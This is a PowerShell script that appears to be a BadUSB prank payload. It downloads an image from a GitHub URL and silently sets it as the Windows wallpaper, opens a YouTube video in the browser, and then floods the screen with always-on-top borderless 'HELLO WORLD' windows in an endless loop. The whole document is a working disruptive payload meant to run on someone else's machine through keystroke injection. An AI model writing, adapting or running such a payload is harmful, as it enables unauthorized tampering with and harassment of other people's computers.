Start-Job -ScriptBlock {
    $url = 'https://raw.githubusercontent.com/usercode-admin/Badusb-Badble/main/main.png'
    $temp = "$env:TEMP\temp.png"
    $save = "$env:USERPROFILE\Pictures\main.png"

    try {
        Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing
    } catch {
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object System.Drawing.Bitmap(1920, 1080)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.Clear([System.Drawing.Color]::Green)
        $font = New-Object System.Drawing.Font("Arial", 80)
        $g.DrawString("BADUSB", $font, [System.Drawing.Brushes]::White, 700, 400)
        $bmp.Save($temp, [System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()
        $g.Dispose()
    }

    if (Test-Path $save) {
        $count = 1
        while (Test-Path "$env:USERPROFILE\Pictures\main_$count.png") { $count++ }
        $save = "$env:USERPROFILE\Pictures\main_$count.png"
    }
    Move-Item $temp $save -Force

    Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
namespace Win32 {
    public class Wp {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}
'@ -ErrorAction SilentlyContinue

    [Win32.Wp]::SystemParametersInfo(20, 0, $save, 3)
}

$videoUrl = "https://youtu.be/kBJ6D02FfpI?si=o61csrk7zwq-sLkf"
$browsers = @("chrome", "msedge")

foreach ($b in $browsers) {
    $path = (Get-Command $b -ErrorAction SilentlyContinue).Source
    if ($path) {
        Start-Process -FilePath $path -ArgumentList "--new-window --window-size=800,600 `"$videoUrl`""
        break
    }
}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

$scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$maxForms = 20
$forms = [System.Collections.ArrayList]::new()

while ($true) {
    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = 'None'
    $form.StartPosition = 'Manual'
    $form.Width = 400
    $form.Height = 120
    $form.Left = (Get-Random -Min 0 -Max ($scr.Width - $form.Width))
    $form.Top = (Get-Random -Min 0 -Max ($scr.Height - $form.Height))
    $form.BackColor = [System.Drawing.Color]::Black
    $form.TopMost = $true
    $form.ControlBox = $false

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "HELLO WORLD"
    $label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
    $label.ForeColor = [System.Drawing.Color]::White
    $label.BackColor = [System.Drawing.Color]::Black
    $label.AutoSize = $false
    $label.Width = $form.Width
    $label.Height = $form.Height
    $label.TextAlign = 'MiddleCenter'
    $label.Dock = 'Fill'

    $form.Controls.Add($label)
    $form.Show()

    $forms.Add($form) | Out-Null

    if ($forms.Count -gt $maxForms) {
        $oldest = $forms[0]
        $oldest.Close()
        $forms.RemoveAt(0)
    }

    Start-Sleep -Seconds 1
}

# Giữ script chạy
while ($true) { Start-Sleep 1 }
